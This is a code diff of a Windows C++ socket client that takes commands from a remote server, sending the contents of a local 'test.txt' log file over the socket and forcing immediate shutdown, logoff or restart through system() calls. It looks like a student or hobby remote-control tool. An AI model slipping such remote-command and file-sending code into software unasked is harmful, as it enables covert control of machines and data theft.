@@ -1,38 +1,36 @@
+#include <cstdio>
 #include <conio.h>
 #include <winsock2.h>
-#include <cstdio>
 #include <stdlib.h>
-#include <cstring>
 #include <Windows.h>
-#include <ctype.h>
+#include <cstring>
 
 void sendLog(SOCKET new_socket){
-    FILE * f;
-    int words=0;
-    char c;
-    char buffer[200];
-    f = fopen("test.txt","r");
-    // while((c=getc(f))!=EOF){
-    //     fscanf(f,"%s",buffer);
-    //     if((isspace(c))||c=='\t')
-    //         words++;
-    // }
-    // send(new_socket,&words,sizeof(words),0);
-    rewind(f);
-    char ch;
-    printf("\n\tClient: sending file");
-    while(ch!=EOF){
-        fscanf(f,"%s",buffer);
-        printf("\n\tClient: sending this - %s",buffer);
-        send(new_socket,buffer,strlen(buffer),0);
-        printf("\n\tClient: word sent");
-        ch = fgetc(f);
+    FILE * fp;
+    fp = fopen("test.txt","rb");
+    if(fp==NULL){
+        printf("\n\tClient: File open error");
+        return;   
     }
-    printf("\n\tClient: file sent");
-    fclose(f);
+    printf("\n\tClient: Sending Logs");
+    while(1){
+        /* First read file in chunks of 256 bytes */
+        char buff[1024]={0};
+        int nread = fread(buff,1,1024,fp);       
+        /* If read was success, send data. */
+        if(nread>0){
+            // printf("\n\tClient: Sending : %s",buff);
+            // write(new_socket, buff, nread);
+            send(new_socket,buff,sizeof(buff),0);
+        }
+        if(feof(fp) || ferror(fp))
+            break;
+    }
+    fclose(fp);
+    printf("\n\tClient: Logs Sent");
 }
 
-void shutDown(){
+void shutdown(){
     // Immediate shutdown
     system("C:\\WINDOWS\\System32\\shutdown /s /t 0");
 }
@@ -80,14 +78,23 @@ int main(){
             printf("%c",message[i]);
             dynamicMessage[i] = message[i];
         }
-        if(strcmp(dynamicMessage,"sendlog")==0)
+        // cut off potential tailing \n
+        dynamicMessage[strcspn(dynamicMessage, "\n")] = '\0';
+        if(strcmp(dynamicMessage,"sendlog")==0){
             sendLog(server);
-        else if(strcmp(dynamicMessage,"shutdown")==0)
-            shutDown();
-        else if(strcmp(dynamicMessage,"restart")==0)
-            restart();
-        else if(strcmp(dynamicMessage,"logoff")==0)
+        }
+        else if(strcmp(dynamicMessage,"shutdownuser")==0){
+            printf("\n\tClient: Shutting down...");
+            shutdown();
+        }
+        else if(strcmp(dynamicMessage,"logoffuser")==0){
+            printf("\n\tClient: Logging off...");
             logoff();
+        }
+        else if(strcmp(dynamicMessage,"restartuser")==0){
+            printf("\n\tClient: Restarting...");
+            restart();
+        }
     }
     closesocket(server);
     int SUCCESS = WSACleanup();
